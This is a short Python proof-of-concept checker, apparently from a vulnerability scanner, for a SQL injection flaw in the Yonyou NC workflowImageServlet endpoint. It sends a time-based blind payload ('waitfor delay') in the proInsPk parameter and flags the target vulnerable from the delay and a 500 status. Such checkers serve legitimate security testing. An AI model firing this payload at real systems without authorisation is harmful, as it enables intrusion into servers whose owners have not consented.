import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友NC-workflowImageServlet接口存在sql注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)',
        'Content-Type':'application/x-www-form-urlencoded'
    }
    vurl = urllib.parse.urljoin(url, "/portal/pt/servlet/workflowImageServlet/doPost?pageId=login&wfpk=1&proInsPk=1'waitfor+delay+'0:0:6'--")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code == 500 and response.elapsed.total_seconds() > 5:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult